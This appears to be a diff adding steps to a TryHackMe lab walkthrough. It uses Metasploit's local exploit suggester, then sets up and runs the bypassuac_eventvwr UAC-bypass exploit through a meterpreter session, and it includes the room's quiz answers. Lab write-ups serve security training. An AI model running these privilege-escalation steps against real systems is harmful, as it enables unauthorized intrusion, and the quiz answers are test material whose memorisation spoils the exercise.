@@ -88,5 +88,33 @@ Now that we know some of the finer details of the system we are working with, le
 
 Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
 
+![](../../img/Pasted%20image%2020220827192856.png)
+
+
+Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
+- exploit/windows/local/bypassuac_eventvwr
+
+
+Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
+
+
+
+Go ahead and select our previously found local exploit for use using the command `use exploit/windows/local/bypassuac_eventvwr`
+
+
+Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
+
+
+Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
+- LHOST
+
+![](../../img/Pasted%20image%2020220827193105.png)
+
+
+Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`
+
+
+After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 
+
 
 
